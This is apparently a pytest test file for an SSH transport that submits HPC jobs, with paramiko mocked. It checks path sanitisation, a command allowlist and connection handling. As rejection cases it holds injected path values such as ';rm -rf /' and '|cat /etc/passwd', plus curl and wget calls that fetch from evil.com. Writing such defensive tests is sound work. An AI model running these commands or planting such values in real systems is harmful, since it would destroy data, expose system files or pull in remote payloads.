"""Tests for SSH Transport (NFM-377).

Tests path validation, command allowlist, and connection behavior.
No real SSH connections — paramiko is mocked.
"""

from __future__ import annotations

import asyncio
import sys
from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from nfm_md_runner.ssh_transport import (
    SSHTransport,
    _validate_path,
    _validate_remote_command,
)


# ---------------------------------------------------------------------------
# Credentials stub
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class _Creds:
    host: str = "hpc.example.com"
    user: str = "testuser"
    ssh_key_path: str = "/home/test/.ssh/id_ed25519"
    port: int = 22
    work_dir: str = "/scratch/nfmd"


# ---------------------------------------------------------------------------
# Path validation
# ---------------------------------------------------------------------------


class TestValidatePath:
    """Path whitelist validation."""

    def test_safe_path(self):
        _validate_path("/scratch/nfmd/job-123/output.log")

    def test_safe_path_with_dots(self):
        _validate_path("./relative/path.txt")

    def test_path_with_semicolon_rejects(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_path("/scratch/;rm -rf /")

    def test_path_with_pipe_rejects(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_path("/scratch/|cat /etc/passwd")

    def test_path_with_space_rejects(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_path("/scratch/my file.txt")

    def test_path_with_backtick_rejects(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_path("/scratch/`evil`")

    def test_path_with_dollar_rejects(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_path("/scratch/$HOME")


# ---------------------------------------------------------------------------
# Command validation
# ---------------------------------------------------------------------------


class TestValidateCommand:
    """Remote command allowlist validation."""

    def test_sbatch_allowed(self):
        _validate_remote_command("sbatch /scratch/job.sh")

    def test_squeue_allowed(self):
        _validate_remote_command("squeue -j 42")

    def test_scancel_allowed(self):
        _validate_remote_command("scancel 42")

    def test_mkdir_allowed(self):
        _validate_remote_command("mkdir -p /scratch/nfmd")

    def test_rm_allowed(self):
        _validate_remote_command("rm /scratch/nfmd/temp.log")

    def test_cat_allowed(self):
        _validate_remote_command("cat /scratch/nfmd/output.log")

    def test_disallowed_command_rejects(self):
        with pytest.raises(ValueError, match="Disallowed"):
            _validate_remote_command("curl http://evil.com/payload")

    def test_disallowed_wget_rejects(self):
        with pytest.raises(ValueError, match="Disallowed"):
            _validate_remote_command("wget http://evil.com/malware")

    def test_disallowed_python_rejects(self):
        with pytest.raises(ValueError, match="Disallowed"):
            _validate_remote_command("python -c 'import os'")

    def test_empty_command_rejects(self):
        with pytest.raises(ValueError, match="Disallowed"):
            _validate_remote_command("")

    def test_command_with_leading_space(self):
        """Commands with leading whitespace are trimmed before validation."""
        _validate_remote_command("   sbatch /scratch/job.sh")


# ---------------------------------------------------------------------------
# SSHTransport connection
# ---------------------------------------------------------------------------


class TestSSHTransportConnect:
    """SSH connection establishment."""

    @pytest.mark.asyncio
    async def test_connect_success(self):
        """connect() establishes SSH and sets is_connected."""
        creds = _Creds()
        transport = SSHTransport(credentials=creds)

        mock_client = MagicMock()
        with patch.dict("sys.modules", paramiko=MagicMock(SSHClient=lambda: mock_client, RejectPolicy=MagicMock)):
            await transport.connect()

        assert transport.is_connected
        mock_client.connect.assert_called_once_with(
            "hpc.example.com",
            22,
            "testuser",
            "/home/test/.ssh/id_ed25519",
            30.0,
        )

    @pytest.mark.asyncio
    async def test_connect_failure_raises(self):
        """connect() raises ConnectionError when SSH fails."""
        creds = _Creds()
        transport = SSHTransport(credentials=creds)

        mock_client = MagicMock()
        mock_client.connect.side_effect = Exception("Connection refused")
        with patch.dict("sys.modules", paramiko=MagicMock(SSHClient=lambda: mock_client, RejectPolicy=MagicMock)):
            with pytest.raises(ConnectionError, match="SSH connection to hpc.example.com"):
                await transport.connect()

        assert not transport.is_connected

    @pytest.mark.asyncio
    async def test_close(self):
        """close() resets is_connected."""
        creds = _Creds()
        transport = SSHTransport(credentials=creds)

        mock_client = MagicMock()
        with patch.dict("sys.modules", paramiko=MagicMock(SSHClient=lambda: mock_client, RejectPolicy=MagicMock)):
            await transport.connect()
            assert transport.is_connected

            await transport.close()
            assert not transport.is_connected
            mock_client.close.assert_called_once()


# ---------------------------------------------------------------------------
# exec_command
# ---------------------------------------------------------------------------


class TestSSHTransportExecCommand:
    """Remote command execution."""

    @pytest.mark.asyncio
    async def test_exec_returns_stdout(self):
        """exec_command returns decoded stdout."""
        creds = _Creds()
        transport = SSHTransport(credentials=creds)

        mock_stdout = MagicMock()
        mock_stdout.read.return_value = b"Submitted batch job 42\n"

        mock_client = MagicMock()
        mock_client.exec_command.return_value = (MagicMock(), mock_stdout, MagicMock())

        with patch.dict("sys.modules", paramiko=MagicMock(SSHClient=lambda: mock_client, RejectPolicy=MagicMock)):
            await transport.connect()
            result = await transport.exec_command("sbatch /scratch/job.sh")

        assert result == "Submitted batch job 42"

    @pytest.mark.asyncio
    async def test_exec_not_connected_raises(self):
        """exec_command raises ConnectionError when not connected."""
        creds = _Creds()
        transport = SSHTransport(credentials=creds)

        with pytest.raises(ConnectionError, match="SSH not connected"):
            await transport.exec_command("squeue -j 42")

    @pytest.mark.asyncio
    async def test_exec_disallowed_command_rejects(self):
        """exec_command raises ValueError for disallowed commands."""
        creds = _Creds()
        transport = SSHTransport(credentials=creds)

        mock_client = MagicMock()
        with patch.dict("sys.modules", paramiko=MagicMock(SSHClient=lambda: mock_client, RejectPolicy=MagicMock)):
            await transport.connect()

            with pytest.raises(ValueError, match="Disallowed"):
                await transport.exec_command("curl http://evil.com")
